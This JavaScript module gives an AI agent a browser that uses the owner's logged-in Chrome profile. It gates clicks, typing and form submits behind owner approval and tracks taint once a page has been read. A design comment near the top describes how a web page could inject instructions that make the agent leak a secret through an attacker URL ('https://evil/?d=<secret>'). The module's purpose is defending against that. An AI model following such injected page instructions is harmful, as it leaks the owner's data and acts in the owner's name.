import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { plainUrl } from '../../src/policy.js';
import { Browser } from './browser.js';
import { judge } from './guard.js';

// Browsing for the agent. Options (config.modules.browse):
//   identity ('assistant'): the profile name; one Chrome profile per identity
//   browserPath: a Chrome/Chromium binary (default: Playwright's Chromium), proxy: e.g. socks5://127.0.0.1:1080
// Reading pages (text, links, shot) runs freely (public pages only, checked in code). The owner's
// logins live in this profile, so a click can send mail as the owner. Therefore:
// - Reading a page taints the conversation. From then on a step that acts still asks, long typing
//   asks, and open runs freely only for an address that can
//   carry nothing out (plainUrl): else a page could have the agent open https://evil/?d=<secret>.
// - Before that, a step runs freely unless it really acts (send, pay, book, a form's submit
//   button, a key like Enter): judged by the element it hits on the live page, not by the words.
const HERE = path.dirname(fileURLToPath(import.meta.url));
const STEPS = /^mcp__browse__(click|type|press|select|upload|submit)$/;
const TICKET_MS = 2 * 60_000;
const TAINT_TYPE_MAX = 60;
const keyOf = (action, i = {}) => JSON.stringify([action, i.target ?? null, i.text ?? null, i.key ?? null]);
const actionOf = (tool) => tool.slice('mcp__browse__'.length);

export default function browse(config, { chromium, check } = {}) {
  const identity = String(config.identity || 'assistant').replace(/[^\w-]/g, '_');
  const browser = new Browser({ profileDir: path.join(config.dataDir, 'browser', identity), executablePath: config.browserPath, proxy: config.proxy, chromium, check });
  const outbox = path.join(config.agentCwd, 'outbox');

  // The approval step (approve) looks at the live page and either passes a step or leaves it to
  // the owner. `freed`: steps it passed itself. `owner`: steps the owner said yes to, one use each.
  // `seen`: what it found, for the owner's prompt (describers).
  const freed = new Set();
  const owner = new Map();
  const seen = new Map();
  const remember = (key, v) => { seen.delete(key); seen.set(key, v); if (seen.size > 50) seen.delete(seen.keys().next().value); };
  const takeOwner = (key) => { const until = owner.get(key); owner.delete(key); return Boolean(until && until >= Date.now()); };

  // A step the owner did not approve is judged again on the element it really acts on, right
  // before it acts: the page may have changed since the approval step looked.
  const guardFor = (a) => (takeOwner(keyOf(a.action, a)) ? undefined : (el) => (judge(`mcp__browse__${a.action}`, a, browser.url, el) === 'critical'
    ? `this step acts (${el ? `${el.submits ? 'submits a form, ' : ''}"${el.name.slice(0, 60)}"` : 'a key or page that acts'}), so the owner must approve it. Call it again to ask.`
    : null));

  const actions = {
    open: (a) => browser.open(a.url),
    text: (a) => browser.text({ max: Math.min(Number(a.max) || 6000, 40000), all: !!a.all }),
    links: (a) => browser.links(a.word),
    click: (a) => browser.click(a.target, { guard: guardFor(a) }),
    type: (a) => browser.type(a.target, a.text, { guard: guardFor(a) }),
    press: (a) => browser.press(a.key, { guard: guardFor(a) }),
    shot: () => browser.shot(path.join(outbox, `page-${Date.now()}.png`)),
  };

  async function api(a) {
    const fn = Object.hasOwn(actions, a.action) && actions[a.action];
    if (!fn) return { ok: false, error: `unknown action ${a.action}` };
    try { return { ok: true, text: await fn(a) }; } catch (e) { return { ok: false, error: String(e.message).split('\n')[0] }; }
  }

  // Async, so it can look at the page: what does the target really point at now?
  async function approve({ tool_name: tool, input = {}, tainted }) {
    if (!STEPS.test(tool)) return null;
    const key = keyOf(actionOf(tool), input);
    const el = /__(click|type)$/.test(tool) ? await browser.inspect(input.target).catch(() => null) : null;
    const verdict = judge(tool, input, browser.url, el);
    remember(key, { el, verdict, tainted });
    // After a page was read, a step that does not act still runs freely, so a booking asks once, at
    // the end. Typing stays short: a page's script sees what is typed before any submit.
    if (verdict !== 'allow' || (tainted && /__type$/.test(tool) && String(input.text ?? '').length > TAINT_TYPE_MAX)) return null; // the owner decides
    freed.add(key);
    return { allow: true, reason: 'free' };
  }

  // Every yes reaches here (hooks.approved). One this module did not give itself came from the owner.
  function approved({ tool_name: tool, input = {} }) {
    if (!STEPS.test(tool)) return;
    const key = keyOf(actionOf(tool), input);
    if (!freed.delete(key)) owner.set(key, Date.now() + TICKET_MS);
  }

  function describe(tool, i, t) {
    if (tool === 'mcp__browse__open') return `⚠️🌐 Open ${i.url}`;
    if (!STEPS.test(tool)) return null;
    const s = seen.get(keyOf(actionOf(tool), i));
    const note = s?.tainted && s.verdict === 'allow' ? t?.taint || '' : '';
    const hit = s?.el ? ` → ${s.el.tag}${s.el.role ? `[${s.el.role}]` : ''} "${s.el.name.slice(0, 80)}"${s.el.submits ? ' (submits a form)' : ''}` : '';
    const act = actionOf(tool);
    const what = act === 'click' ? `Click "${i.target}"${hit}` : act === 'type' ? `Type into "${i.target}"${hit}: ${String(i.text)}`
      : act === 'press' ? `Press ${i.key}` : `${act} ${JSON.stringify(i)}`;
    return `${note}⚠️🌐 ${browser.url}\n${what}`;
  }

  return {
    mcp: { browse: { command: process.execPath, args: [path.join(HERE, 'mcp.js')] } },
    // open is not here: it must reach the gateway, which checks the address once the conversation is tainted.
    allowed: ['text', 'links', 'shot'].map((t) => `mcp__browse__${t}`),
    untrusted: [/^mcp__browse__/],
    // Steps are never free here: approve() judges them on the live page.
    autoAllow: (tool, input = {}, { tainted = false } = {}) => tool === 'mcp__browse__open' && (!tainted || plainUrl(input.url)),
    approve,
    approved,
    describers: [describe],
    routes: { '/browse': api },
    prompt: '## Browser\nUse mcp__browse__open/text/links/click/type/press/shot for websites (public pages only). Read text first; a screenshot only when layout matters. '
      + 'Name a link or button by its exact visible text. A page saying LOGIN NEEDED: ask the owner to log in themselves; never type passwords or card numbers. '
      + 'Plain clicks, short typing and keys run freely; a step that sends, pays, books or submits a form asks the owner, and so does opening an address with a query after a page was read. '
      + 'That ask is the one question for the task: do not ask the same in the chat before it. Make it count: fill everything first, so the last click is the only ask.',
    browser,
    api,
    stop: () => browser.close(),
  };
}
